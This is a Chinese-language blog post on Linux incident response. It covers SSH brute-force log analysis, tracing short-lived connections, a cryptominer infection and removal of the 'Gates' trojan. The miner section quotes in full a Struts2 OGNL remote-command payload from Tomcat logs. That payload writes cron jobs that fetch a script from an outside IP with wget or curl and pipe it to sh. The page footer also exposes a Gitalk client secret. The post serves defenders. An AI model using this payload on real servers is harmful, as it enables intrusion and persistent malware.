如果命令被替换了，如何还原回来：

文件提取还原案例：

rpm  -qf /bin/ls  查询ls命令属于哪个软件包

mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象

rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下

cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失
</code></pre><h2 id="实战1-SSH异常"><a href="#实战1-SSH异常" class="headerlink" title="实战1 - SSH异常"></a>实战1 - <code>SSH</code>异常</h2><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><blockquote>
<p>SSH 端口异常，我们首先有必要先来了解一下系统账号情况</p>
</blockquote>
<h4 id="A、系统账号情况"><a href="#A、系统账号情况" class="headerlink" title="A、系统账号情况"></a>A、系统账号情况</h4><p>1、除 <code>root</code> 之外，是否还有其它特权用户 (<code>uid</code>  为 0)</p>
<pre><code>[root@localhost ~]# awk -F: &#39;$3==0{print $1}&#39; /etc/passwd

root
</code></pre><p>2、可以远程登录的帐号信息</p>
<pre><code>[root@localhost ~]# awk &#39;/$1|$6/{print $1}&#39; /etc/shadow

root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::
</code></pre><p>我们可以确认目前系统只有一个管理用户 root。</p>
<p>接下来，我们想到的是 <code>/var/log/secure</code>，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p>
<h4 id="B、确认攻击情况"><a href="#B、确认攻击情况" class="headerlink" title="B、确认攻击情况"></a>B、确认攻击情况</h4><p>1、统计了下日志，发现大约有 <code>126254</code> 次登录失败的记录，确认服务器遭受暴力破解</p>
<pre><code>[root@localhost ~]# grep -o &quot;Failed password&quot; /var/log/secure|uniq -c

     126254 Failed password
</code></pre><p>2、输出登录爆破的第一行和最后一行，确认爆破时间范围</p>
<pre><code>[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|head -1

Jul  8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2

[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|tail -1

Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2
</code></pre><p>3、进一步定位有哪些 <code>IP</code> 在爆破</p>
<pre><code>[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c | sort -nr 

    12622 23.91.xxx.xxx     8942 114.104.xxx.xxx     8122 111.13.xxx.xxx     7525 123.59.xxx.xxx     ...................
</code></pre><p>4、爆破用户名字典都有哪些？</p>
<pre><code>[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}&#39;|uniq -c|sort -nr

      9402  root      3265  invalid user oracle      1245  invalid user admin      1025  invalid user user      .....................
</code></pre><h4 id="C、管理员最近登录情况："><a href="#C、管理员最近登录情况：" class="headerlink" title="C、管理员最近登录情况："></a>C、管理员最近登录情况：</h4><p>1、登录成功的日期、用户名、<code>IP</code></p>
<pre><code>[root@localhost ~]# grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $1,$2,$3,$9,$11}&#39; 

Jul 9 09:38:09 root 192.168.143.100Jul 9 14:55:51 root 192.168.143.100Jul 10 08:54:26 root 192.168.143.100Jul 10 16:25:59 root 192.168.143.100............................
</code></pre><p>通过登录日志分析，并未发现异常登录时间和登录<code>IP</code>。</p>
<p>2、顺便统计一下登录成功的 <code>IP</code> 有哪些</p>
<pre><code>[root@localhost ~]# grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more

     27 192.168.204.1
</code></pre><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p>
<h3 id="处理措施"><a href="#处理措施" class="headerlink" title="处理措施"></a>处理措施</h3><p><code>SSH</code>暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p>
<ol>
<li><p>禁止向公网开放管理端口，若必须开放应限定管理 IP 地址并加强口令安全审计（口令长度不低于 8 位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</p>
</li>
<li><p>更改服务器 ssh 默认端口。</p>
</li>
<li><p>部署入侵检测设备，增强安全防护。</p>
</li>
</ol>
<h2 id="应急响应实战之短连接"><a href="#应急响应实战之短连接" class="headerlink" title="应急响应实战之短连接"></a>应急响应实战之短连接</h2><p>短连接（<code>short connnection</code>）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p>
<h3 id="应急场景"><a href="#应急场景" class="headerlink" title="应急场景"></a>应急场景</h3><p>某天，网络管理员在出口 <code>WAF</code> 检测到某台服务器不断向香港<code>I</code>发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。</p>
<h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。 </p>
<p><img src="http://static.zybuluo.com/1kbfree/dl7hwlpecam9vnn0xpcpe6m2/image_1dauf89vvji28d91gh51mcm1duseb.png" alt="image_1dauf89vvji28d91gh51mcm1duseb.png-374.4kB"></p>
<p>手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。</p>
<p>脚本文件如下：</p>
<pre><code>#!/bin/bash

ip=118.184.15.40

i=1

while:

do

  tmp=netstat -anplt|grep $ip|awk -F&#39;[/]&#39;&#39;{print $1}&#39;|awk &#39;{print $7}&#39;

  #echo $tmp

  iftest -z&quot;$tmp&quot;

  then

      ((i=i+1)) 

  else

      forpid in$tmp; do

          echo&quot;PID: &quot;${pid}

         result=`ls -lh /proc/$pid|grep exe`

         echo&quot;Process: &quot;${result}

         kill-9$pid

      done

      break

  fi

done

echo&quot;Total number of times: &quot;${i}
</code></pre><p>运行结果如下： </p>
<p><img src="http://static.zybuluo.com/1kbfree/xbqkui0c3timppktswptvz75/image_1daufb8d71ii11v7imge1isq1tqveo.png" alt="image_1daufb8d71ii11v7imge1isq1tqveo.png-21.6kB"></p>
<p>跑了三次脚本，可以发现短连接每次发起的进程 <code>Pid</code> 一直在变，但已经捕捉到发起该异常连接的进程源文件为 <code>/usr/lib/nfsiod</code></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。</p>
<h2 id="应急响应实战之挖矿病毒"><a href="#应急响应实战之挖矿病毒" class="headerlink" title="应急响应实战之挖矿病毒"></a>应急响应实战之挖矿病毒</h2><p>随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（<code>EternalBlue</code>）、<code>web</code> 攻击多种漏洞（如 <code>Tomcat</code> 弱口令攻击、<code>Weblogic WLS</code> 组件漏洞、<code>Jboss</code> 反序列化漏洞、<code>Struts2</code> 远程命令执行等），导致大量服务器被感染挖矿程序的现象 。</p>
<h3 id="应急场景-1"><a href="#应急场景-1" class="headerlink" title="应急场景"></a>应急场景</h3><p>某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：</p>
<p><img src="http://static.zybuluo.com/1kbfree/0pofgk2v3kypi2rucc8457rc/image_1daugme8rmg4cmpi0212mp4odf5.png" alt="image_1daugme8rmg4cmpi0212mp4odf5.png-349.8kB"></p>
<h3 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="A、排查过程"><a href="#A、排查过程" class="headerlink" title="A、排查过程"></a>A、排查过程</h4><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 </p>
<p><img src="http://static.zybuluo.com/1kbfree/ep5z9rq8pkl2k89ksu7sh1rs/image_1daugogrf1d2h1lbocp1g3p1ijefi.png" alt="image_1daugogrf1d2h1lbocp1g3p1ijefi.png-92.6kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/weqpm9ohz2kw9kox0iti3sd6/image_1daugpfq61iekbp1rs4iccqjrfv.png" alt="image_1daugpfq61iekbp1rs4iccqjrfv.png-143.7kB"></p>
<p>下载 <code>logo.jpg</code>，包含脚本内容如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/7ux7nwnv9mwyix5fdln5ccq4/image_1daugtgppuss1kd8a1h1p5s1eumgc.png" alt="image_1daugtgppuss1kd8a1h1p5s1eumgc.png-391.2kB"></p>
<p>到这里，我们可以发现攻击者下载 <code>logo.jpg</code> 并执行了里面了 <code>shell</code> 脚本，那这个脚本是如何启动的呢？</p>
<p><strong>通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/wytry3ayvhlfwq8qfevhoep8/image_1daugvc5o13eipur1rsbklq1aeigp.png" alt="image_1daugvc5o13eipur1rsbklq1aeigp.png-188.8kB"></p>
<h4 id="B、溯源分析"><a href="#B、溯源分析" class="headerlink" title="B、溯源分析"></a>B、溯源分析</h4><p>在 <code>Tomcat log</code> 日志中，我们找到这样一条记录</p>
<p><img src="http://static.zybuluo.com/1kbfree/f1u9q5gfz5871x2huystcpab/image_1dauh2ganpnnfd7h0mljac27h6.png" alt="image_1dauh2ganpnnfd7h0mljac27h6.png-156.4kB"></p>
<p>对日志中攻击源码进行摘录如下</p>
<pre><code>{(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo &quot;*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh&quot; | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
</code></pre><p>可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过 <code>Struct</code> 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。</p>
<h4 id="C、清除病毒"><a href="#C、清除病毒" class="headerlink" title="C、清除病毒"></a>C、清除病毒</h4><p>1、删除定时任务</p>
<p><img src="http://static.zybuluo.com/1kbfree/mdouj9c1elcy0yf09m3f7vg3/image_1dauh5q2r1jfqhl7fjd1d261aq0hj.png" alt="image_1dauh5q2r1jfqhl7fjd1d261aq0hj.png-226.9kB"></p>
<p>2、终止异常进程</p>
<p><img src="http://static.zybuluo.com/1kbfree/yt7f3n6atq6x9dhnv0nvj5p3/image_1dauh6bk4196j1clkt8u1e0d2hsi0.png" alt="image_1dauh6bk4196j1clkt8u1e0d2hsi0.png-101.2kB"></p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>针对服务器被感染挖矿程序的现象，总结了几种预防措施：</p>
<p>1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</p>
<p>2、及时更新 <code>Windows</code> 安全补丁，开启防火墙临时关闭端口</p>
<p>3、及时更新 <code>web</code> 漏洞补丁，升级 <code>web</code> 组件</p>
<h2 id="应急响应实战之盖茨木马"><a href="#应急响应实战之盖茨木马" class="headerlink" title="应急响应实战之盖茨木马"></a>应急响应实战之盖茨木马</h2><p><code>Linux</code> 盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的 <code>DDoS</code> 木马，主要恶意特点是具备了后门程序，<code>DDoS</code> 攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用 <code>Gates</code> 这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。</p>
<h3 id="应急场景-2"><a href="#应急场景-2" class="headerlink" title="应急场景"></a>应急场景</h3><p>某天，网站管理员发现服务器 CPU 资源异常，几个异常进程占用大量网络带宽：</p>
<p><img src="http://static.zybuluo.com/1kbfree/twv34jhjj48bxu1h19fxcdse/image_1dauhda2n17c41qgd14ao2l21cpid.png" alt="image_1dauhda2n17c41qgd14ao2l21cpid.png-436.6kB"></p>
<h3 id="事件分析-1"><a href="#事件分析-1" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="异常-IP-连接"><a href="#异常-IP-连接" class="headerlink" title="异常 IP 连接"></a>异常 <code>IP</code> 连接</h4><p><img src="http://static.zybuluo.com/1kbfree/cvdt4sgmqwdgxt77nrvccrtu/image_1dauhe6qr15t4kh21g2j1clf749iq.png" alt="image_1dauhe6qr15t4kh21g2j1clf749iq.png-188.5kB"></p>
<h4 id="异常进程"><a href="#异常进程" class="headerlink" title="异常进程"></a>异常进程</h4><p>查看进行发现 <code>ps aux</code> 进程异常，进入该目录发现多个命令，猜测命令可能已被替换</p>
<p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 </p>
<p><img src="http://static.zybuluo.com/1kbfree/07omz385idgmzq2faf7uii6e/image_1dauhkmjd16r51d9h1chrbt11bhmj7.png" alt="image_1dauhkmjd16r51d9h1chrbt11bhmj7.png-377.9kB"></p>
<h4 id="异常启动项"><a href="#异常启动项" class="headerlink" title="异常启动项"></a>异常启动项</h4><p>进入<code>rc3.d</code>目录可以发现多个异常进行：</p>
<pre><code>/etc/rc.d/rc3.d/S97DbSecuritySpt

/etc/rc.d/rc3.d/S99selinux
</code></pre><p><img src="http://static.zybuluo.com/1kbfree/z7lcihp9ty3ekltcobuti8pp/image_1dauhn4jn8jev43bh1bcvnjijk.png" alt="image_1dauhn4jn8jev43bh1bcvnjijk.png-204.4kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/peloafmxfmzegxtsqus5785r/image_1dauhnpr5119th7s1c7f1egpgupkd.png" alt="image_1dauhnpr5119th7s1c7f1egpgupkd.png-116.5kB"></p>
<h4 id="搜索病毒原体"><a href="#搜索病毒原体" class="headerlink" title="搜索病毒原体"></a>搜索病毒原体</h4><pre><code>find / -size -1223124c -size +1223122c -exec ls -id {} \;   搜索 1223123 大小的文件 
</code></pre><p>从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见：</p>
<p><code>Linux</code>平台“盖茨木马”分析</p>
<p><a href="http://www.freebuf.com/articles/system/117823.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/117823.html</a></p>
<p>悬镜服务器卫士丨<code>Linux</code>平台“盖茨木马”分析</p>
<p><a href="http://www.sohu.com/a/117926079_515168" target="_blank" rel="noopener">http://www.sohu.com/a/117926079_515168</a></p>
<h4 id="手动清除木马过程："><a href="#手动清除木马过程：" class="headerlink" title="手动清除木马过程："></a>手动清除木马过程：</h4><p>1、简单判断有无木马</p>
<pre><code>#有无下列文件

cat/etc/rc.d/init.d/selinux

cat/etc/rc.d/init.d/DbSecuritySpt

ls/usr/bin/bsd-port

ls/usr/bin/dpkgd

#查看大小是否正常

ls-lh/bin/netstat

ls-lh/bin/ps

ls-lh/usr/sbin/lsof

ls-lh/usr/sbin/ss
</code></pre><p>2、上传如下命令到 <code>/root</code> 下</p>
<pre><code>ps netstat ss lsof
</code></pre><p>3、删除如下目录及文件</p>
<pre><code>rm-rf/usr/bin/dpkgd (ps netstat lsof ss)

rm-rf/usr/bin/bsd-port     #木马程序

rm-f/usr/bin/.sshd         #木马后门

rm-f/tmp/gates.lod

rm-f/tmp/moni.lod

rm-f/etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序)

rm-f/etc/rc.d/rc1.d/S97DbSecuritySpt

rm-f/etc/rc.d/rc2.d/S97DbSecuritySpt

rm-f/etc/rc.d/rc3.d/S97DbSecuritySpt

rm-f/etc/rc.d/rc4.d/S97DbSecuritySpt

rm-f/etc/rc.d/rc5.d/S97DbSecuritySpt

rm-f/etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty)

rm-f/etc/rc.d/rc1.d/S99selinux

rm-f/etc/rc.d/rc2.d/S99selinux

rm-f/etc/rc.d/rc3.d/S99selinux

rm-f/etc/rc.d/rc4.d/S99selinux

rm-f/etc/rc.d/rc5.d/S99selinux
</code></pre><p>4、找出异常程序并杀死</p>
<p>5、删除含木马命令并重新安装</p>
<h3 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h3><h4 id="RPM-check-检查"><a href="#RPM-check-检查" class="headerlink" title="RPM check 检查"></a><code>RPM check</code> 检查</h4><p>系统完整性也可以通过 <code>rpm</code> 自带的 <code>-Va</code> 来校验检查所有的 <code>rpm</code> 软件包,有哪些被篡改了,防止 <code>rpm</code> 也被替换,上传一个安全干净稳定版本 <code>rpm</code> 二进制到服务器上进行检查</p>
<pre><code>./rpm -Va &gt; rpm.log
</code></pre><p>如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, <code>c</code> 用以指配置文件, 接着是文件名. 8 位字符的每一个 用以表示文件与 <code>RPM</code> 数据库中一种属性的比较结果 。. (点) 表示测试通过。.下面的字符表示对 <code>RPM</code> 软件包进行的某种测试失败：</p>
<h4 id="命令替换-1"><a href="#命令替换-1" class="headerlink" title="命令替换"></a>命令替换</h4><pre><code>rpm2cpio 包全名 |  cpio -idv .文件绝对路径   rpm 包中文件提取

Rpm2cpio  将 rpm 包转换为 cpio 格式的命令 

Cpio 是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件

Cpio 选项 &lt; [文件|设备]

-i：copy-in 模式，还原-d：还原时自动新建目录-v：显示还原过程
</code></pre><h4 id="文件提取还原案例"><a href="#文件提取还原案例" class="headerlink" title="文件提取还原案例"></a>文件提取还原案例</h4><p>查询<code>ls</code>命令属于哪个软件包</p>
<pre><code>rpm  -qf /bin/ls  

mv  /bin/ls /tmp  
</code></pre><p>提取<code>rpm</code>包中<code>ls</code>命令到当前目录的 <code>/bin/ls</code> 下</p>
<pre><code>rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls
</code></pre><p>把 <code>ls</code> 命令复制到 <code>/bin/</code> 目录 修复文件丢失:</p>
<pre><code>cp /root/bin/ls  /bin/ 
</code></pre><p>挂载命令 <code>rpm</code> 包：</p>
<pre><code>mkdir  /mnt/chrom/  建立挂载点

mount -t iso9660 /dev/cdrom  /mnt/cdrom/  挂在光盘

mount/dev/sr0 /mnt/cdrom/
</code></pre><p>卸载命令</p>
<pre><code>umount  设备文件名或挂载点

umount /mnt/cdrom/
</code></pre>
            </div>
            <hr>

            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">Reprint please specify: </span>
                    <a href="https://only-free.github.into" class="b-link-green">only_free blog</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/2019/05/23/linux-ying-ji-xiang-ying/" class="b-link-green">Linux应急响应</a>
                </p>
            </div>
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'e4a00225a8ce0411166b',
        clientSecret: '1d6d28b5dffe48a2a0c13a8417df522474c99103',
        repo: 'only-free.github.io',
        owner: 'only-free',
        admin: "only-free",
        id: '2019-05-23T01-26-49',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">Previous</div>
            <div class="card">
                <a href="/2019/05/23/dui-web-an-quan-de-yi-xie-jing-yan-fen-xiang-url-tiao-zhuan-pian/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="对web安全的一些经验分享[url跳转篇]">
                        
                        <span class="card-title">对web安全的一些经验分享[url跳转篇]</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">今年是挖洞的一年了，也对web安全产生了感情，之前盲目于一直挖洞每天技术都没什么增长，多的仅是那么一点点的经验，而且通过这次的护网行动，也看出了自己的很多不足，说白了就是很菜然后自己还没看清自己，所以接下来的日子里，自己都会尽量去接触一些自</div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-23
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-user fa-fw"></i>
                            only_free
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/经验分享/" target="_blank">
                        <span class="chip bg-color">经验分享</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">Next</div>
            <div class="card">
                <a href="/2019/05/23/window-ying-ji-xiang-ying/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Window应急响应">
                        
                        <span class="card-title">Window应急响应</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">排查方法1. 开机启动项是否存在异常文件2. 浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息3. 各个盘下的temp相关目录下查看有无异常文件4. 通过对文件右键属性即可看到详细的时间（修改时间在创建时间之前明显是可疑文件）5. 查</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-23
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-user fa-fw"></i>
                            only_free
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/应急响应/" target="_blank">
                        <span class="chip bg-color">应急响应</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>
    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title">TOC</div>
            <div id="toc-content">

            </div>
        </div>
    </div>
</div>

<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingSelector: 'h1, h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });
    });
</script>
    

</main>


<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            在心灵的深处，敞开的希望是自由。
            <br> 本站总访问 <span id="busuanzi_value_site_pv"></span> 次
        </div>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <div class="col s12 m4 l4 social-link"><a href="#!" class="tooltipped" target="_blank" data-tooltip="微信联系我：refuel_iamfree" data-position="top" data-delay="50">
    <i class="fa fa-weixin"></i>
</a>
<a href="mailto:1900065568@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>
<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1900065568" data-position="top" data-delay="50">
    <i class="fa fa-qq"></i>
</a>
</div>
    </div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title">Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword" class="search-input" autofocus>
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->


</body>
</html>